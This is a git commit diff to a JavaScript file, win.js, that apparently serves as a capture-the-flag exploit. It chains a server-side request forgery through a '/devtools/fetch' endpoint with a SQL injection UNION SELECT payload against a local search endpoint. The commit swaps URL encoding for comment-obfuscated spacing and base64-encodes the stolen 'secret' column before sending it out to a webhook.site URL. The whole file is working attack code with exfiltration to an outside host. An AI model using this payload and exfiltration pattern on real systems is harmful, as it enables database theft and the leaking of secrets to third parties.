6e9d4a9bd519c087601980e66ffcf0a3e0f7e119
bahylol <94308278+bahylol@users.noreply.github.com>
2026-04-19 18:23:45 +0200

    Modify fetch request for SQL injection payload
    Updated the fetch request to include a modified URL with encoded SQL injection payload.

--- win.js
+++ win.js
@@ -1,11 +1,11 @@
-u='http://127.0.0.1:8080/search?q=' + encodeURIComponent("' UnIoN SeLeCt 1,secret,3,4 FrOm secrets--");
 fetch('/devtools/fetch', {
   method: 'POST',
   headers: {'Content-Type': 'application/json'},
-  credentials: 'include',
-  body: JSON.stringify({url: u})
+  body: JSON.stringify({
+    url: "http://127.0.0.1:8080/search?q='/**/UnIoN/**/SeLeCt/**/1,secret,3,4/**/FrOm/**/secrets--"
+  })
 })
 .then(r => r.json())
 .then(d => {
-  fetch('https://webhook.site/8c62b06e-fc89-4a48-b546-c925fe959850?flag=' + encodeURIComponent(d.body));
+  fetch('https://webhook.site/8c62b06e-fc89-4a48-b546-c925fe959850?flag=' + btoa(d.body));
 });
